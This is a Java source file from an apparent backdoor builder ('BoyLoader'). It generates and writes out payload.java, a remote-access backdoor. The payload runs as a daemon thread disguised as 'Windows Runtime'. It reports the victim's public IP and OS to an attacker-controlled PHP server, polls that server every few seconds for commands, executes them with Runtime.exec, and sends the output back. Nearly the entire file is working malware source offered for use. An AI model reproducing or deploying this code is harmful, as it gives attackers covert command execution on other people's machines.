package net.wind.core.Config;

import net.wind.BoyLoader;

import java.io.*;

/**
 * createTime 2022/11/19 0019
 * fileName MakePayload
 *
 * @author WindStream
 */

public class MakePayload {
    public static String payload;
    public static void createPayload() throws IOException {
        payload = "import java.io.*;\n" +
                "import java.net.*;\n" +
                "import java.nio.charset.Charset;\n" +
                "\n" +
                "/**\n" +
                " * createTime 2022/10/15 0015\n" +
                " * fileName payload\n" +
                " *\n" +
                " * @author WindStream\n" +
                " */\n" +
                "\n" +
                "public class payload extends Thread{\n" +
                "    public static String doGet(String URL){\n" +
                "        HttpURLConnection conn = null;\n" +
                "        InputStream is = null;\n" +
                "        BufferedReader br = null;\n" +
                "        StringBuilder result = new StringBuilder();\n" +
                "        try{\n" +
                "            java.net.URL url = new URL(URL);\n" +
                "\n" +
                "            conn = (HttpURLConnection) url.openConnection();\n" +
                "            conn.setRequestMethod(\"GET\");\n" +
                "\n" +
                "            conn.setConnectTimeout(15000);\n" +
                "            conn.setReadTimeout(60000);\n" +
                "            conn.setRequestProperty(\"Accept\", \"application/json\");\n" +
                "\n" +
                "            conn.connect();\n" +
                "            if (200 == conn.getResponseCode()){\n" +
                "                is = conn.getInputStream();\n" +
                "                br = new BufferedReader(new InputStreamReader(is, \"UTF-8\"));\n" +
                "                String line;\n" +
                "                while ((line = br.readLine()) != null){\n" +
                "                    result.append(line);\n" +
                "                    //System.out.println(line);\n" +
                "                }\n" +
                "            }else{\n" +
                "                return \"null\";\n" +
                "            }\n" +
                "        }catch (MalformedURLException e){\n" +
                "            e.printStackTrace();\n" +
                "        }catch (IOException e){\n" +
                "            e.printStackTrace();\n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }finally {\n" +
                "            try{\n" +
                "                if(br != null){\n" +
                "                    br.close();\n" +
                "                }\n" +
                "                if(is != null){\n" +
                "                    is.close();\n" +
                "                }\n" +
                "            }catch (IOException ioe){\n" +
                "                ioe.printStackTrace();\n" +
                "            }\n" +
                "            conn.disconnect();\n" +
                "        }\n" +
                "        return result.toString();\n" +
                "    }\n" +
                "    private static String IP = \"\";\n" +
                "    private static int Port = 0;\n" +
                "    private static String phpClient = \""+BoyLoader.phpClient+"\";\n" +
                "    public void run() {\n" +
                "        String IP = doGet(\"http://ident.me/\");\n" +
                "        String y_System = System.getProperty(\"os.name\");\n" +
                "        String System = y_System.replace(\" \",\"\");\n" +
                "        doGet(phpClient+\"/connectHost.php?ip=\"+IP);\n" +
                "        doGet(phpClient+\"/ClientSystem.php?ip=\"+IP+\"&system=\"+System);\n" +
                "        while(true) {\n" +
                "            try {\n" +
                "                Thread.sleep(5000);\n" +
                "                String com = doGet(phpClient+\"/ClientReadServer.php?ip=\"+IP);\n" +
                "                InputStream inputStream = Runtime.getRuntime().exec(com).getInputStream();\n" +
                "                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n" +
                "                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);\n" +
                "                String line = bufferedReader.readLine();\n" +
                "                String reply = \"\";\n" +
                "                while(line != null){\n" +
                "                    reply += line +\"\\n\";\n" +
                "                    line = bufferedReader.readLine();\n" +
                "                }\n" +
                "                doGet(phpClient+\"/ClientShelllReply.php?ip=\"+IP+\"&reply=\"+reply);\n" +
                "                bufferedReader.close();\n" +
                "                inputStreamReader.close();\n" +
                "                inputStream.close();\n" +
                "            } catch (InterruptedException e) {\n" +
                "                throw new RuntimeException(e);\n" +
                "            } catch (IOException e) {\n" +
                "                throw new RuntimeException(e);\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    //Main backDoor Program\n" +
                "    public static void backDoor(){\n" +
                "          payload payload = new payload();\n" +
                "          payload.setPriority(10);\n" +
                "          payload.setName(\"Windows Runtime\");\n" +
                "          payload.setDaemon(true);\n" +
                "          payload.start();\n" +
                "\n" +
                "\n" +
                "    }\n" +
                "}";

               File payloadFile = new File(BoyLoader.WorkingDir+BoyLoader.sqlitSigh+"payload.java");
               if (payloadFile.exists()){
                   payloadFile.delete();
                   payloadFile.createNewFile();
                   FileWriter fileWriter = new FileWriter(payloadFile);
                   fileWriter.write(payload);
                   fileWriter.close();
               }else{
                   payloadFile.createNewFile();
                   FileWriter fileWriter = new FileWriter(payloadFile);
                   fileWriter.write(payload);
                   fileWriter.close();
               }
    }
}
